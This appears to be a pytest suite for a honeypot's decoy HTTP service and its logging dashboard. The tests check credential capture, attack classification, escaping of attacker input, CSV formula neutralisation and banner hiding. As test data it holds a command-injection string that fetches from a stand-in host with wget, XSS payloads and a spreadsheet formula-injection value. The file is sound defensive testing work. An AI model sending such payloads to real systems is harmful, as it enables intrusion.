import base64
import csv
import io
import json

import pytest

from app import database
from app.config import settings
from app.dashboard import create_dashboard_app
from services.fake_http import create_fake_http_app


@pytest.fixture
def decoy():
    return create_fake_http_app().test_client()


@pytest.fixture
def dashboard():
    return create_dashboard_app().test_client()


def _event(**overrides):
    event = dict(
        source_ip="203.0.113.5", service="fake_shell", event_type="command",
        raw_input="whoami", classification="reconnaissance", risk_level="medium",
    )
    event.update(overrides)
    database.log_event(**event)


# ----------------------------------------------------------------- fake HTTP

def test_decoy_index_page(decoy):
    response = decoy.get("/")
    assert response.status_code == 200 and b"IoT-CAM-3000" in response.data
    assert database.get_events()[0]["classification"] == "general_probe"


def test_decoy_captures_form_credentials(decoy):
    response = decoy.post("/login", data={"username": "admin", "password": "admin123"})
    assert response.status_code == 401 and b"Invalid credentials" in response.data
    event = database.get_events()[0]
    assert event["event_type"] == "login_attempt"
    assert "username=admin password=admin123" in event["raw_input"]
    assert event["classification"] == "credential_attack"


def test_decoy_post_to_admin_does_not_405(decoy):
    assert decoy.post("/admin", data={"username": "a", "password": "b"}).status_code == 401


def test_decoy_captures_basic_auth(decoy):
    token = base64.b64encode(b"root:toor").decode()
    decoy.get("/status", headers={"Authorization": f"Basic {token}"})
    attempts = [e for e in database.get_events() if e["event_type"] == "login_attempt"]
    assert "username=root password=toor" in attempts[0]["raw_input"]


def test_decoy_logs_query_string_and_user_agent(decoy):
    decoy.get("/setup.cgi?cmd=;wget http://x/y", headers={"User-Agent": "zgrab/0.x"})
    event = database.get_events()[0]
    assert "cmd=" in event["raw_input"] and "ua=zgrab/0.x" in event["raw_input"]
    assert event["classification"] == "exploit_attempt" and event["risk_level"] == "high"


def test_decoy_scans_and_unusual_methods(decoy):
    assert decoy.get("/phpmyadmin").status_code == 404
    assert database.get_events()[0]["classification"] == "web_admin_scan"
    assert decoy.put("/upload.php", data=b"<?php ?>").status_code == 404
    assert "body=<?php ?>" in database.get_events()[0]["raw_input"]


def test_decoy_rejects_oversized_body(decoy):
    response = decoy.post("/login", data=b"a=" + b"x" * (settings.max_http_body_bytes + 10),
                          content_type="application/x-www-form-urlencoded")
    assert response.status_code == 413


# ----------------------------------------------------------------- dashboard

def test_dashboard_renders_and_escapes_attacker_input(dashboard):
    _event(raw_input='<script>alert(1)</script>', source_ip='"><img src=x onerror=alert(1)>')
    response = dashboard.get("/")
    assert response.status_code == 200
    assert b"<script>alert(1)</script>" not in response.data
    assert b"&lt;script&gt;alert(1)&lt;/script&gt;" in response.data
    assert b"<img src=x" not in response.data
    assert "default-src 'none'" in response.headers["Content-Security-Policy"]
    assert response.headers["X-Frame-Options"] == "DENY"


def test_dashboard_has_no_external_resources(dashboard):
    body = dashboard.get("/").data
    assert b"<script" not in body and b"http://" not in body and b"https://" not in body


def test_dashboard_filters_and_pagination(dashboard):
    for index in range(60):
        _event(raw_input=f"cmd{index}")
    _event(service="http", raw_input="GET /only-http")

    first = dashboard.get("/").data
    assert b"cmd59" in first and b"cmd5<" not in first and b"Older" in first
    assert b"cmd5<" in dashboard.get("/?page=2").data
    filtered = dashboard.get("/?service=http").data
    assert b"GET /only-http" in filtered and b"cmd59" not in filtered
    assert dashboard.get("/?page=abc&service=%00").status_code == 200


def test_api_events_and_stats(dashboard):
    for index in range(5):
        _event(raw_input=f"cmd{index}")
    events = dashboard.get("/api/events?limit=2").get_json()
    assert [event["raw_input"] for event in events] == ["cmd4", "cmd3"]
    assert len(dashboard.get("/api/events?limit=999999").get_json()) == 5
    assert dashboard.get("/api/stats").get_json()["total_events"] == 5


def test_exports(dashboard):
    _event(raw_input="=HYPERLINK(\"http://evil\")")
    _event(raw_input="plain, with comma")

    exported = json.loads(dashboard.get("/api/export?format=json").data)
    assert [event["raw_input"] for event in exported] == ['=HYPERLINK("http://evil")', "plain, with comma"]

    rows = list(csv.DictReader(io.StringIO(dashboard.get("/api/export?format=csv").data.decode())))
    assert rows[0]["raw_input"].startswith("'=")       # formula neutralised
    assert rows[1]["raw_input"] == "plain, with comma"
    assert dashboard.get("/api/export?format=xml").status_code == 400


def test_empty_exports(dashboard):
    assert json.loads(dashboard.get("/api/export?format=json").data) == []
    assert dashboard.get("/api/export?format=csv").data.decode().startswith("id,timestamp")


def test_healthz(dashboard):
    assert dashboard.get("/healthz").get_json() == {"status": "ok"}


def test_dashboard_auth(monkeypatch):
    import dataclasses

    from app import dashboard as dashboard_module

    secured = dataclasses.replace(settings, dashboard_password="s3cret")
    monkeypatch.setattr(dashboard_module, "settings", secured)
    client = create_dashboard_app().test_client()

    def basic(user, password):
        return {"Authorization": "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()}

    for path in ("/", "/api/events", "/api/stats", "/api/export"):
        assert client.get(path).status_code == 401
    assert "Basic" in client.get("/").headers["WWW-Authenticate"]
    assert client.get("/", headers=basic("admin", "wrong")).status_code == 401
    assert client.get("/", headers=basic("other", "s3cret")).status_code == 401
    assert client.get("/", headers={"Authorization": "Basic !!!"}).status_code == 401
    assert client.get("/", headers=basic("admin", "s3cret")).status_code == 200
    assert client.get("/healthz").status_code == 200          # for container health checks


def test_served_decoy_does_not_reveal_the_real_server():
    """Through waitress, the only server banner is the fake one."""
    import http.client
    import threading

    from waitress.server import create_server

    from services.fake_http import SERVER_IDENT

    server = create_server(create_fake_http_app(), host="127.0.0.1", port=0, ident=SERVER_IDENT)
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()
    try:
        connection = http.client.HTTPConnection("127.0.0.1", server.effective_port, timeout=5)
        connection.request("GET", "/login")
        response = connection.getresponse()
        headers = {name.lower(): value for name, value in response.getheaders()}
        response.read()
        connection.close()
    finally:
        server.close()

    assert headers["server"] == SERVER_IDENT
    assert "via" not in headers
    assert "waitress" not in str(headers).lower() and "python" not in str(headers).lower()
